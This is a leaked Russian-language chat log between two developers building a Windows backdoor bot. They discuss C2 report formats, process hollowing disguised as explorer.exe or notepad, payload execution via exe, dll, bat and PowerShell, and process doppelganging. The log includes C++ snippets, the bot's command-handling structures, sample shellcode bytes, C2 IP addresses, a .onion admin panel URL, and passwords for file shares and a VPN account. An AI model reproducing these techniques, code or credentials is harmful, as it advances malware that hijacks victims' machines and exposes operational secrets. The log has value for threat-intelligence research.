2020-10-14 17:40:39.697423	cany	kaktus	в команде terminate process в поле с пидом можно написать все что угодно
2020-10-14 17:40:55.908722	cany	kaktus	мне ожидать что придет не валидное значение?
2020-10-14 17:49:24.448884	kaktus	cany	команда 16 идет в виде код-пробел-имя_файла. Причем имя файла вводится оператором вручную, в нем может быть что угодно. Тебе надо принять возможные корректные варианты имени с полным путем - тоесть может быть в кавычках (как в некоторых API требуется), может без. Если корректный полный путь не распарсился, то считаешь всю команду некорректной и меняешь на "по умолчанию"
2020-10-14 17:51:09.268359	kaktus	cany	terminate process - тоже самое, данные вводит пользователь и проверку по максимуму ты делаешь при попытке распарсить. Если вместо пид пусто или буквы а не цифры - считаешь что команда некорректная
2020-10-14 17:53:19.348684	cany	kaktus	и на фронте валидность вообще никак не проверяется?
2020-10-14 17:54:01.908808	kaktus	cany	считай что нет, у тебя задача любую команду проверить (какую ты сам сможешь ввести в админке), определить корректность и распарсить
2020-10-14 17:54:32.676577	cany	kaktus	когда запуск чего-то идет с помощью дампа, в какую директорию мне сохранять?
2020-10-14 17:57:52.305035	kaktus	cany	будет достаточно в %temp% в первой версии
2020-10-14 18:03:26.675162	cany	kaktus	в terminate process в тз написано в ответе отправить результат выполнения GetLastError() сразу после выполнения TerminateProcess()
2020-10-14 18:03:34.624955	cany	kaktus	если была ошибка до этого
2020-10-14 18:04:11.957091	cany	kaktus	то она вернет эту ошибку не смотря на то что terminate правильно отработал
2020-10-14 18:08:10.648724	cany	kaktus	и я вот отвечаю серверу на команду остановки процесса
2020-10-14 18:08:15.864672	cany	kaktus	отправляю номер пида
2020-10-14 18:08:16.669839	kaktus	cany	сбрось сначала: 1) SetLastError(0) 2) TerminateProcess(...)
2020-10-14 18:08:23.390225	cany	kaktus	понял
2020-10-14 18:08:31.525249	cany	kaktus	отправляю пид
2020-10-14 18:08:44.043741	cany	kaktus	и он не принимает
2020-10-14 18:09:05.716055	cany	kaktus	заголовок такой
2020-10-14 18:09:06.321769	cany	kaktus	Cookie: group=canytest\r\nContent-Type: form/urlencoded
2020-10-14 18:09:11.436952	kaktus	cany	куда номер пида отправляешь?
2020-10-14 18:09:25.479728	cany	kaktus	на сервер %id%/3
2020-10-14 18:10:37.701791	kaktus	cany	form/urlencoded - не так, формат по другому называется
2020-10-14 18:13:00.213099	kaktus	cany	Content-Type: application/x-www-form-urlencoded
2020-10-14 18:29:52.646705	cany	kaktus	ты мне кидал по допелю cpp файл
2020-10-14 18:29:59.454927	cany	kaktus	а заголовочные можешь?
2020-10-14 18:32:54.739658	kaktus	cany	каких не хватает?
2020-10-14 18:33:39.880886	cany	kaktus	..\nttypes.h
pe_hdrs_helper.h
2020-10-14 18:38:04.044913	kaktus	cany	v7Ms2N(se^jAxieN
2020-10-14 18:38:05.758081	kaktus	cany	Download: https://qaz.im/load/isnYzY/YBzDS8
Delete: https://qaz.im/index.php?a=delete&q=1584027253
2020-10-14 18:40:19.063931	cany	kaktus	с Content-Type все равно не выходит
2020-10-14 18:40:24.677912	cany	kaktus	с которым ты написал
2020-10-14 18:41:06.862653	kaktus	cany	у тебя один формат отчетов на все команды (кроме 16 отправка файла), если систинфо проходит - по тому же принципу все остальные должны
2020-10-14 18:41:25.280745	kaktus	cany	в плане алгоритма кодирования, то есть
2020-10-16 16:11:10.883820	cany	kaktus	привет
2020-10-16 16:11:14.795444	cany	kaktus	ip бк не менялся?
2020-10-16 16:18:38.213498	kaktus	cany	привет
2020-10-16 16:18:39.477576	kaktus	cany	18.188.194.80
2020-10-16 16:18:43.109331	kaktus	cany	вот этот пробуй
2020-10-16 16:19:07.660661	kaktus	cany	и еще резервный 54.91.36.142
2020-10-16 16:19:57.519563	cany	kaktus	подошло
2020-10-18 17:16:03.023670	cany	kaktus	привет
2020-10-18 17:16:12.772127	cany	kaktus	у бк опять ip изменились?
2020-10-18 17:22:57.598048	kaktus	cany	привет!
2020-10-18 17:22:58.852528	kaktus	cany	54.236.253.121
2020-10-18 17:23:18.374398	kaktus	cany	54.201.135.91
2020-10-19 07:56:45.255818	kaktus	cany	новый адрес админки БК
2020-10-19 07:56:46.773248	kaktus	cany	https://qsohf4rg4nscdkun.onion:4247/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/
2020-10-19 07:56:54.113272	kaktus	cany	учетные данные старые
2020-10-19 14:32:48.750780	kaktus	cany	админка БК работает пока по старому адресу, новый отменен
2020-10-19 18:16:36.012107	kaktus	cany	новый адрес админки БК
2020-10-19 18:16:36.187299	kaktus	cany	https://qsohf4rg4nscdkun.onion:4247/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/
2020-10-19 18:16:36.187856	kaktus	cany	учетные данные старые
2020-10-19 18:16:36.189064	kaktus	cany	админка БК работает пока по старому адресу, новый отменен
2020-10-19 21:02:32.719523	cany	kaktus	у меня впн истекает
2020-10-20 06:44:05.808711	cany	kaktus	у меня впн истекает
2020-10-20 17:18:27.089897	cany	kaktus	привет
2020-10-20 17:19:08.693413	kaktus	cany	Привет!
2020-10-20 17:19:14.676346	kaktus	cany	впн заказал, пока не готово
2020-10-20 17:22:17.196133	cany	kaktus	почему то сервер не принимает ответы на выполнение exe
2020-10-20 17:22:20.520176	cany	kaktus	и на dll
2020-10-20 17:22:32.329044	cany	kaktus	команда становится pending
2020-10-20 17:22:41.590510	cany	kaktus	и он готов отправлять новую
2020-10-20 17:23:34.403713	kaktus	cany	pending - значит что бот забрал команду и она в на выполнении
2020-10-20 17:23:43.660739	kaktus	cany	то есть отчет по команде еще не получен
2020-10-20 17:24:01.496317	cany	kaktus	но в этоге я отправляю а не доходит
2020-10-20 17:24:22.528903	kaktus	cany	как не доходит - ошибка, нет соединения вообще?
2020-10-20 17:24:56.342194	kaktus	cany	какой код ответа сервера на отчет - если 500 надо смотреть ответ (что-то не так с форматом)
2020-10-20 17:25:50.197584	kaktus	cany	в ответе ты направляешь хедер с группой?
2020-10-20 17:26:06.540344	cany	kaktus	в cookie
2020-10-20 17:26:35.219294	kaktus	cany	да, также как в GET /%id%/2
2020-10-20 17:30:54.187981	cany	kaktus	не получается выполнить bat через pipe
2020-10-20 17:31:46.292906	cany	kaktus	в пайп пишутся команды
2020-10-20 17:31:57.526391	cany	kaktus	а на выходе эти же команды
2020-10-20 17:32:47.217088	kaktus	cany	в какой пайп пишешь команды?
2020-10-20 17:34:06.565403	cany	kaktus	у меня 2 пайпа
2020-10-20 17:34:32.687640	kaktus	cany	гит не открыватся, заработает посмотрю
2020-10-20 17:34:48.256002	cany	kaktus	я и закомитить туда не мог
2020-10-20 17:35:05.434187	cany	kaktus	void RunChannelBat(string bat)
{
	HANDLE readBegin, writeBegin;
	HANDLE readEnd, writeEnd;

	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	PROCESS_INFORMATION pi = { 0 };
	DWORD tbRead = 0;
	DWORD errRead = 0;
	DWORD bRead = 0;
	DWORD currentRead = 0;
	DWORD cbWritten = 0;
	string outputResult;

	if (!CreatePipe(&readBegin, &writeBegin, &sa, 0))
	{

	}

	if (!CreatePipe(&readEnd, &writeEnd, &sa, 0))
	{

	}

	_STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = readBegin;
	si.hStdOutput = writeEnd;
	si.hStdError = writeEnd;

	char wbuf[512];
	DWORD dw1 = GetSystemDirectoryA(wbuf, 512);
	string cmd(wbuf, dw1);
	cmd += "\\cmd.exe";
	/*SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
	SetHandleInformation(hStdErrRd, HANDLE_FLAG_INHERIT, 0);*/

	CreateProcessA((char*)cmd.c_str(), NULL, NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	Sleep(1000);
	auto arr = split(bat, "\r\n");
	arr.push_back("exit");
	//WriteFile(writeBegin, bat.c_str(), bat.size(), &cbWritten, NULL);
	for (size_t i = 0; i < arr.size(); ++i)
	{
		string str = arr.at(i) + "\r\n";
		WriteFile(writeBegin, str.c_str(), str.size(), &cbWritten, NULL);
	}
	//Sleep(1000);
	outputResult = ReadResultFromPipe(readEnd);

	return;
2020-10-20 17:35:34.471578	cany	kaktus	различные варианты пробовал
2020-10-20 17:35:44.298791	cany	kaktus	и в createprocess передавать весь батник
2020-10-20 17:35:56.788463	cany	kaktus	и разом все записать в пайп
2020-10-20 17:40:36.303465	cany	kaktus	еще по допелю в заголовочных что ты мне скинул есть еще заголовочный "includes.h"
2020-10-20 17:56:08.203737	kaktus	cany	b7mSg3jWKa@fvZMIRhg8D
2020-10-20 17:56:09.536042	kaktus	cany	Download: https://qaz.im/load/8hHBE4/94yzB6
Delete: https://qaz.im/index.php?a=delete&q=747023653
2020-10-20 17:56:18.914776	kaktus	cany	пример корректного отчета по команде Run EXE
2020-10-20 17:57:07.450692	kaktus	cany	"includes.h" - общие хедеры (для всех модулей), аналог стандартного stdafx.h
2020-10-20 17:57:35.418708	kaktus	cany	#include <Winsock2.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <strsafe.h>
#include <Winhttp.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <stdint.h>
#include <KtmW32.h>
#include <userenv.h>
#include <type_traits>
2020-10-20 18:01:43.636887	kaktus	cany	запуск бат через пайп: запускай cmd.exe с ключем /k
2020-10-20 18:02:07.410562	kaktus	cany	можешь писать весь бат целиком в пайп, без разбивки по строкам
2020-10-20 18:02:18.465763	kaktus	cany	в конце допиши "\nexit\n"
2020-10-20 18:11:59.923876	cany	kaktus	в process hollowed нужно stdout и stderr прочитать
2020-10-20 18:12:08.201701	cany	kaktus	я делаю так же как и с дампом
2020-10-20 18:12:25.723676	cany	kaktus	те в createprocess передаю пайпы
2020-10-20 18:12:34.817282	cany	kaktus	но читать от туда не получается
2020-10-20 18:18:17.378439	kaktus	cany	anonymous-vpn.biz famada@ro.ru 4137LGY5P2V
2020-10-20 18:18:20.022316	kaktus	cany	новый ВПН
2020-10-20 18:21:16.294011	kaktus	cany	[21:12:35] <asmwardest> но читать от туда не получается
2020-10-20 18:21:30.951754	kaktus	cany	ошибка при чтении?
2020-10-20 18:23:40.860190	cany	kaktus	PeekNamedPipe(hStdOutRd, NULL, NULL, NULL, &tbRead, NULL);
2020-10-20 18:23:50.440194	cany	kaktus	в tbRead ничего не приходит
2020-10-20 18:24:38.573999	kaktus	cany	нагрузка которую ты инжектишь - работает?
2020-10-20 18:24:43.361751	kaktus	cany	а то может процесс сразу с ошибкой вылетает
2020-10-20 18:25:23.070969	cany	kaktus	да
2020-10-20 18:25:25.987094	cany	kaktus	работает
2020-10-20 18:28:58.798352	kaktus	cany	PeekNamedPipe с ошибкой завершается?
2020-10-20 18:29:03.087446	kaktus	cany	GetLastError() после нее какой код?
2020-10-20 18:33:06.567579	kaktus	cany	ты хост-процесс создаешь без наследования хендлов
2020-10-20 18:33:18.466712	kaktus	cany	bInheritHandles = TRUE должно быть
2020-10-20 18:33:41.191424	kaktus	cany	пятый аргумент в CreateProcessA
2020-10-20 18:34:56.348272	kaktus	cany	шестой аргумент надо CREATE_NEW_CONSOLE | CREATE_SUSPENDED
2020-10-20 18:35:07.500775	kaktus	cany	иначе не получится инжектить консольную нагрузку в GUI-хост и наоборот
2020-10-20 18:35:13.027351	cany	kaktus	а вот то что маскируем под блокнот например
2020-10-20 18:35:17.439722	cany	kaktus	но в инфе о процессе
2020-10-20 18:35:28.367952	cany	kaktus	видно что директория бэкдора
2020-10-20 18:35:34.305124	cany	kaktus	и отец тоже он
2020-10-20 18:35:37.428695	cany	kaktus	это нормально?
2020-10-20 18:36:02.095840	kaktus	cany	директорию ты при запуске можешь задать
2020-10-20 18:36:15.162261	kaktus	cany	она берется из среды окружения родительского процесса, если явно не указывать
2020-10-20 18:36:43.931399	cany	kaktus	это нужно делать?
2020-10-20 18:37:12.946902	kaktus	cany	в боевом режиме у тебя бот будет сам работать из холловинга, тоевсть explorer.exe или cmd.exe
2020-10-20 18:37:31.214606	cany	kaktus	ну да
2020-10-20 18:37:35.703299	kaktus	cany	и создаваемые им чилд-процессы будут наследовать соответственно
2020-10-20 18:37:59.035939	cany	kaktus	а вот все таки например я отправляю инфу о системе
2020-10-20 18:38:05.711530	cany	kaktus	у меня там встречаются русские символы
2020-10-20 18:38:06.113333	kaktus	cany	то есть если это надо будет делать - то в лоадере
2020-10-20 18:38:28.440795	cany	kaktus	мне нужно добиться чтобы они корректно отправлялись?
2020-10-20 18:38:59.190495	kaktus	cany	корректно это как?
2020-10-20 18:39:20.587233	kaktus	cany	сейчас я твой отчет гляну
2020-10-20 18:39:31.950337	cany	kaktus	чтобы на сервере по русски тоже был текст
2020-10-20 18:45:28.063800	kaktus	cany	у тебя последний отчет нормальный, все корректно
2020-10-20 18:46:22.412647	kaktus	cany	сервер не заточен под работу с русским, на 95% ПО будет использоваться на англоязычных машинах
2020-10-20 18:46:45.337174	kaktus	cany	поэтому оставляй как есть
2020-10-20 18:47:20.930040	kaktus	cany	когда будут конкретно по этому вопросы замечания - тогда и озадачишься
2020-10-20 18:48:50.127776	cany	kaktus	хорошо
2020-10-20 18:56:33.686805	cany	kaktus	а для пайпов обязательно делать
2020-10-20 18:56:33.894031	cany	kaktus	SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
2020-10-20 18:56:36.969009	cany	kaktus	?
2020-10-20 18:57:53.454753	kaktus	cany	нет
2020-10-20 18:59:01.020756	kaktus	cany	это на случай чтобы второй конец пайпа тоже в какой-нибудь процесс не передать
2020-10-20 18:59:23.716966	kaktus	cany	но у тебя их всего 3 штуки, не ошибешься наверное)
2020-10-20 18:59:50.918699	cany	kaktus	ага
2020-10-20 19:00:24.675084	cany	kaktus	а как можно из потока вернуть строку?
2020-10-20 19:00:32.244482	cany	kaktus	как результат выполнения функции
2020-10-20 19:01:19.657648	kaktus	cany	тоесть
2020-10-20 19:01:41.501907	cany	kaktus	у меня функция отработала в отдельном потоке
2020-10-20 19:01:51.640735	cany	kaktus	я могу как-то получить результат этой функции
2020-10-20 19:02:20.099062	cany	kaktus	не просто ее код возврата
2020-10-20 19:02:31.811123	cany	kaktus	а строку какую нибудь
2020-10-20 19:02:43.686270	kaktus	cany	шеллкод?
2020-10-20 19:02:52.825663	cany	kaktus	не
2020-10-20 19:03:03.776228	cany	kaktus	моя обычная
2020-10-20 19:03:23.107196	kaktus	cany	в поток передается параметр, он может быть любого типа - например указатель на массив
2020-10-20 19:03:40.509391	kaktus	cany	в потоке пишешь в этот массив (или даже аллоцируешь память там)
2020-10-20 19:03:40.791262	cany	kaktus	а обратно в главный поток?
2020-10-20 19:04:07.291996	kaktus	cany	родительский поток передает этот указатель же, тоесть он знает где массив
2020-10-20 19:04:30.712401	cany	kaktus	если не динамический то по окончанию потока там пустая строка
2020-10-20 19:05:06.589104	kaktus	cany	ты память выделяешь в родительском потоке, или в самом дочернем?
2020-10-20 19:05:19.518672	cany	kaktus	я динамически не выделяю
2020-10-20 19:05:37.822054	cany	kaktus	мне по хорошему из потока string вернуть надо
2020-10-20 19:05:41.804272	cany	kaktus	ну или char*
2020-10-20 19:05:56.798404	kaktus	cany	string потокобезопасный класс?
2020-10-20 19:06:17.336531	cany	kaktus	вряд ли
2020-10-20 19:06:49.771122	kaktus	cany	ты можешь передать в поток указатель на указатель, и в него записать char*
2020-10-20 19:07:37.708537	kaktus	cany	тут надо смотреть контекст - данные которые ты передаешь в поток будут эксклюзивно в нем использоваться, или нет
2020-10-20 19:07:43.826337	cany	kaktus	динамически выделить нужное количество памяти в дочернем, а зачистить в родительском?
2020-10-20 19:07:52.297136	kaktus	cany	а то надо делать тогда разграничение, через критическую секцию или мьютекс
2020-10-20 19:08:40.912832	kaktus	cany	как родительский поток проверяет что данные готовы - ждет завершения дочернего потока, периодически сам обращается к памяти?
2020-10-20 19:09:32.204356	cany	kaktus	ждет завершение дочернего процесса и потом использует эти данные
2020-10-20 19:09:35.492069	cany	kaktus	либо не ждет
2020-10-20 19:09:41.105259	cany	kaktus	тогда на данные наплевать
2020-10-20 19:10:03.805310	cany	kaktus	хотя получается освобождение памяти ни кто не сделает
2020-10-20 19:10:15.687421	kaktus	cany	ждет завершение дочернего процесса - так процесса или потока
2020-10-20 19:10:23.257493	cany	kaktus	потока
2020-10-20 19:10:33.690562	cany	kaktus	сейчас речь про потоки
2020-10-20 19:11:10.588843	cany	kaktus	либо использовать глобалки
2020-10-20 19:11:40.817088	cany	kaktus	может наступить момент когда одновременно захотят использовать переменную
2020-10-20 19:11:47.343011	cany	kaktus	но есть mutex
2020-10-20 19:12:28.534979	cany	kaktus	проблема с глобалкой возникла, что если юзать ее в разных cpp то ошибка при компиляции unresolved external symbol...
2020-10-20 19:15:33.609803	cany	kaktus	и еще мне при чтении stdout и stderr нужно их различать и в разные пайпы их писать?
2020-10-20 19:15:39.861716	cany	kaktus	или можно в перемешку все?
2020-10-20 19:17:11.833939	kaktus	cany	можно пока в один, но лучше в разные - данные могут перемешиваться на полуслове
2020-10-20 19:20:35.437803	kaktus	cany	[18.09.2020 15:44:48] <kaktus> скрипт пишет данные - может в out, может в err, может в оба потока попеременно - бери это за основу. 
[18.09.2020 15:45:17] <kaktus> Если у него перенаправлены два вывода в один поток - то они будут путаться.
[18.09.2020 15:45:26] <kaktus> перемешиваться*
[18.09.2020 15:46:29] <kaktus> пример: out AAABBBCCC, err DDDEEEFFF. С одним пайпом ты можешь принять вывод AADDDEABBBEEFCCFC
2020-10-20 19:21:26.522102	kaktus	cany	ошибка при компиляции unresolved external symbol... - на какую функцию?
2020-10-20 19:21:34.514286	cany	kaktus	а мне заканчивать ждать что-то из пайпа до завершения процесса?
2020-10-20 19:21:45.130918	cany	kaktus	на глобальную переменную
2020-10-20 19:24:54.561282	kaktus	cany	можно же объявить в отдельном модуле пару функций - SetGlobalValue, GetGlobalValue и через них ее юзать
2020-10-20 19:25:27.174387	cany	kaktus	попробую
2020-10-20 19:26:01.468615	kaktus	cany	можно сделать структуру с глобальными данными бота, инициировать в стартовой функции и передавать по ссылке везде где она будет нужна
2020-10-20 19:26:36.572197	cany	kaktus	но у меня результат выполнения команды
2020-10-20 19:26:40.981422	cany	kaktus	те строка
2020-10-20 19:26:48.082807	cany	kaktus	в другом потоке находится
2020-10-20 19:26:58.068904	cany	kaktus	глобальные данные это да
2020-10-20 19:26:58.272270	kaktus	cany	в структуре одно поле - ссылка на буфер данных
2020-10-20 19:27:36.191918	kaktus	cany	в поток передаешь эту ссылку, дальше поток работает с буфером данных, привязанным к главной структуре
2020-10-20 19:28:15.415998	cany	kaktus	не совсем понял
2020-10-20 19:42:36.583660	kaktus	cany	объявляем структуры в каком-нибудь общем хедер-файле
2020-10-20 19:42:50.234839	kaktus	cany	typedef struct _BDModuleExecData
{ //данные, используемые при контроле выполнения запущенного модуля/скрипта
	bool is_executing;						// признак того, что дочерний процесс выполняется
	DWORD ProcessStatus;					// последний статус текущего дочернего процесса
	DWORD ProcessStartTime;					// время запуска дочернего процесса 
	PROCESS_INFORMATION pi;					// структура PROCESS_INFORMATION с данными дочернего процесса
	HANDLE hRedirectStdOut;					// пайп для чтения потока STDOUT дочернего процесса
	HANDLE hRedirectStdErr;					// пайп для чтения потока STDERR дочернего процесса
	sBDCommandReport pStdOut;				// выходные данные потока STDOUT дочернего процесса
	sBDCommandReport pStdErr;				// выходные данные потока STDERR дочернего процесса
	char *TmpFileName;						// имя файла модуля (для режима запуска "дамп в файл")
} sBDModuleExecData;

typedef struct _BDMainData
{ //основные данные бота
...
	sBDModuleExecData module_exec_data;			// данные о выполнении модуля/скрипта
...

} sBDMainData;
2020-10-20 19:43:08.817322	kaktus	cany	в главной функции:
2020-10-20 19:43:14.658721	kaktus	cany	void BackDoor_Main()
{
...
	//основные переменные
	sBDMainData * BDMainData = nullptr;
...
BDMainData = (sBDMainData *)HEAP::pAlloc(sizeof(sBDMainData));
	if (!InitBDMainData(BDMainData))
	{
...
	}
...
	BDExecuteCommand(BDMainData...);
...
}
2020-10-20 19:44:02.560621	kaktus	cany	в обработке команд:
2020-10-20 19:44:29.783430	kaktus	cany	int BDExecuteCommand(sBDMainData * bdmaindata, ...)
{ // стартовая подпрограмма выполнения полученной команды
...
		case BDCMD_COMMAND_CODE_RUNEXE: // запуск исполняемого модуля (exe)
		case BDCMD_COMMAND_CODE_RUNDLL: // запуск динамической библиотеки (dll)
		case BDCMD_COMMAND_CODE_RUNBAT: // запуск командного файла (bat)
		case BDCMD_COMMAND_CODE_RUNPWS: // запуск скрипта powershell (ps1)
			switch (BDCommandRunAll(bdmaindata, ...))
			{
...
			}
...
if (bdmaindata->is_bd_blocked_mode)
	{
		BDControlChildProcess(bdmaindata, ...);
	}
...
}
...
int BDCommandRunAll(sBDMainData * bdmaindata, ...)
{ //стартовая подпрограмма обработки команд запуска модулей/скриптов или самообновления
...
if (!LoadExeModule(..., &bdmaindata->module_exec_data, ...))
	{
...
	}
...
}
...
bool LoadExeModule(..., sBDModuleExecData * execdata, ...)
{  //основная подпрограммы подготовки к выполнению команд запуска модуля/скрипта или самообновления
...
result = CreateSimpleProcess(... &execdata->pi, ...);
...

...
}
2020-10-20 19:45:02.411270	kaktus	cany	собираем выходные данные с дочернего процесса:
2020-10-20 19:45:19.658195	kaktus	cany	void BDControlChildProcess(sBDMainData * bdmaindata, ...)
{ //выполняется "контроль" запущенного дочернего процесса (определяется статус, принимаются выходные данные)
...
RetrieveProcessOutputStdStreams(&bdmaindata->module_exec_data, ...);
...
}
...
bool RetrieveProcessOutputStdStreams(sBDModuleExecData * execdata, DWORD TimeOut)
{ //получает выходные данные дочернего процесса из потоков STDOUT и STDERR
...
}
2020-10-20 19:46:34.305718	kaktus	cany	таким образом, все данные привязаны к основной структуре, которая доступна из главного цикла и и ссылка на нее передается при необходимости
2020-10-20 19:58:31.950837	kaktus	cany	не рассматривал вариант чтобы сделать весь бот одном потоке?
2020-10-20 19:58:48.430793	cany	kaktus	а таймауты как реализовать?
2020-10-20 19:59:06.472080	kaktus	cany	кроме шеллкода, его по любому в отдельный поток надо, потому что он в режиме "запустил и забыл", но в контексте этого же процесса, к тому же упасть может
2020-10-20 20:01:03.421411	kaktus	cany	тебе приходит команда выполнять скрипт/модуль - в ней есть общий таймаут (A1), также есть таймаут для проверки следующей команды (A2). Запускаешь процесс и цикл сбора данных на A2 времени, затем возвращаешься в цикл получения следующей команды
2020-10-20 20:02:07.523241	kaktus	cany	получил команду, распарсил - возвращаешься в подпрограмму обработки команд. Проверяешь - бот в блокируещем режиме или нет. Если блокирующий - обрабатываешь только сброс/суицид, иначе возвращаешься к сбору данных на A2 времени.
2020-10-20 20:02:54.015042	cany	kaktus	я примерно так и планировал
2020-10-20 20:03:04.837656	cany	kaktus	плохо только что на ходу
2020-10-20 20:03:07.853810	cany	kaktus	вышло
2020-10-20 20:03:32.345001	cany	kaktus	а блокирующий режим это что будет?
2020-10-20 20:03:47.069657	cany	kaktus	мютекс или флаг может обычный?
2020-10-20 20:04:39.931331	kaktus	cany	ну это просто флаг, показывает выполняется ли в текущий момент команда запуска модуля/скрипта со сбором данных
2020-10-20 20:06:22.231416	kaktus	cany	в многопоточном можно будет и через мьютекс, который затем просигналить при получении сброса/суицида
2020-10-20 20:07:18.654984	kaktus	cany	у меня если что только один бот, он однопоточный. Что проще в реализации и понятности - линейный или многопоточный, не могу сказать.
2020-10-20 20:08:10.367844	kaktus	cany	но мне он сразу показался линейным, поэтому многопоточный вариант не рассматривал
2020-10-20 20:08:51.262765	cany	kaktus	ты имеешь ввиду линейный с отдельными форками для одной команды?
2020-10-20 20:11:54.122144	kaktus	cany	линейный в смысле - последовательное выполнение, каждый этап выполняется в заданных интервалах времени, заранее известных
2020-10-20 20:15:55.414584	kaktus	cany	параллельных вычислений тут нет, поэтому правильно организованный поток данных/управления не должен распараллеливаться. ХОтя возможно использование нескольких потоков упростит управление.
2020-10-20 20:17:06.153815	cany	kaktus	но все равно ведь когда таймаут 0
2020-10-20 20:17:09.418482	kaktus	cany	это только мое мнение, никак не указываю как делать - выбирай наиоблее удобный для себя вариант
2020-10-20 20:18:11.166053	kaktus	cany	когда таймаут ноль - мы запускаем дочерний процесс в фоне - запустили и забыли, выходные данные с него не собираем, завершения не ожидаем
2020-10-20 20:18:34.026766	kaktus	cany	в блокирующий режим не переходим*
2020-10-20 20:21:05.264648	cany	kaktus	а чтобы в process hollowed передать параметры достаточно их указать в createprocess?
2020-10-20 20:22:49.000041	kaktus	cany	да, в параметр CommandLine передаешь имя хост-exe и аргументы
2020-10-20 20:22:59.969091	kaktus	cany	параметры привязываются в PEB
2020-10-20 20:23:23.315981	kaktus	cany	инжекнутый процесс может получить их в любом случае
2020-10-20 20:39:11.527102	cany	kaktus	а есть примеры шелкода?
2020-10-20 20:44:53.908900	kaktus	cany	"90 B8 0A 00 00 00 90 90 48 90 90 75 F9 90 90 C3 "
2020-10-20 20:44:58.506043	kaktus	cany	"90 90 90 90 B8 0A 00 00 00 90 90 48 90 90 75 F9 90 90 C3 90 90 00 00  "
2020-10-20 20:45:40.519905	kaktus	cany	вроде для x86 только
2020-10-20 20:46:22.561028	kaktus	cany	просто циклы конечный на сколько-то секунд и бесконечный
2020-10-20 22:44:52.620543	cany	kaktus	9qHbFT^9FNGBQ[Qfe4}*f*w
2020-10-20 22:46:02.740299	cany	kaktus	Download: https://qaz.im/load/sQSFny/EZeQNf
Delete: https://qaz.im/index.php?a=delete&q=1324875382
2020-10-21 06:36:39.760777	cany	kaktus	9qHbFT^9FNGBQ[Qfe4}*f*w
2020-10-21 06:36:39.952769	cany	kaktus	Download: https://qaz.im/load/sQSFny/EZeQNf
Delete: https://qaz.im/index.php?a=delete&q=1324875382
2020-10-22 18:29:50.475802	cany	kaktus	привет
2020-10-22 18:30:17.170695	kaktus	cany	привет
2020-10-22 18:30:35.046030	kaktus	cany	видел твой коммит последний
2020-10-22 18:30:49.104683	kaktus	cany	что-то с доппелем не выходит?
2020-10-22 18:31:01.062830	cany	kaktus	тогда еще не выходило
2020-10-22 18:31:06.622187	cany	kaktus	думал оставить пока
2020-10-22 18:31:13.877688	cany	kaktus	потому что уже приелось
2020-10-22 18:31:22.885482	cany	kaktus	буду сейчас возвращаться
2020-10-22 18:31:29.203315	kaktus	cany	а последний мой пример не помог?
2020-10-22 18:31:35.911080	kaktus	cany	это из моего БК, рабочий
2020-10-22 18:31:40.838369	cany	kaktus	еще не тестил
2020-10-22 18:31:47.319362	cany	kaktus	powershell скрипты почему не доходят до сервера
2020-10-22 18:32:00.745633	kaktus	cany	отложи допель - сделай сначала логирование, вывод инфы по каждой ошибке вызова функции
2020-10-22 18:32:15.490914	kaktus	cany	чтобы сразу видно было где ошибка и какой код у нее
2020-10-22 18:32:53.203129	kaktus	cany	по запуску powershell отчет в таком же формате, как и bat
2020-10-22 18:33:04.261106	kaktus	cany	если bat принимает ps тоже должен
2020-10-22 18:33:05.365375	cany	kaktus	ну да
2020-10-22 18:33:09.418078	cany	kaktus	я все аналогично делаю
2020-10-22 18:33:24.594125	kaktus	cany	опят таки - какая ошибка
2020-10-22 18:33:37.047156	kaktus	cany	код ответа на отчет какой
2020-10-22 18:35:34.825640	kaktus	cany	админка сейчас не работает
2020-10-22 18:36:18.053951	kaktus	cany	если вот эта ошибка [01:45:58] <asmwardest> Download: https://qaz.im/load/sQSFny/EZeQNf
2020-10-22 18:36:18.150939	cany	kaktus	пока тогда буду делать логирование
2020-10-22 18:36:42.740283	kaktus	cany	talar@ в этой жабе, он занимается бакэндом
2020-10-22 18:36:57.581529	kaktus	cany	я ему инфу передал, ничего не ответил пока
2020-10-22 18:37:17.826702	kaktus	cany	можешь к нему обращаться по багам админки
2020-10-22 18:37:22.616386	cany	kaktus	это просто в какой то момент вылетело, думал пригодиться разработчику
2020-10-22 18:38:23.051174	cany	kaktus	ты мне код кидал
2020-10-22 18:38:24.583280	cany	kaktus	log_library
2020-10-22 18:38:29.180696	cany	kaktus	этим логировать?
2020-10-22 18:39:22.483921	kaktus	cany	да, можно через нее
2020-10-22 18:39:59.435135	kaktus	cany	я же кидал тебе файлик 03. отладочное логирование.txt
2020-10-22 18:40:41.564153	kaktus	cany	не, я тебе в этом чате писал, смотри логи от 12.09
2020-10-22 18:42:15.736132	kaktus	cany	у тебя в последнем плане еще таких работ не было отмечено - валидация командного сервера, стратегия поиска командных серверов
2020-10-22 18:42:19.534861	kaktus	cany	про них не забудь
2020-10-22 18:42:32.276711	cany	kaktus	хорошо
2020-10-22 18:43:12.154551	kaktus	cany	и комменты добавь в код
2020-10-22 18:43:19.007385	kaktus	cany	хотябы по одной строчке на функцию)
2020-10-22 18:43:37.199412	cany	kaktus	понял
2020-10-22 18:48:09.701485	cany	kaktus	в console.h
2020-10-22 18:48:14.013281	cany	kaktus	такая зависимость
2020-10-22 18:48:14.755730	cany	kaktus	#include "..\config.h"
2020-10-22 18:48:19.209527	cany	kaktus	у меня нет файла
2020-10-22 18:49:03.764268	kaktus	cany	у тебя должен быть свой аналог config.h
2020-10-22 18:49:16.343938	kaktus	cany	это файл с настройками и надстройками сборки
2020-10-22 18:49:34.526589	cany	kaktus	а можно пример?
2020-10-22 19:00:46.293933	kaktus	cany	vn&ksg$NsjWk7sBvkwCn
2020-10-22 19:00:47.489821	kaktus	cany	Download: https://qaz.im/load/nFeBAS/K9Rs73
Delete: https://qaz.im/index.php?a=delete&q=1277919339
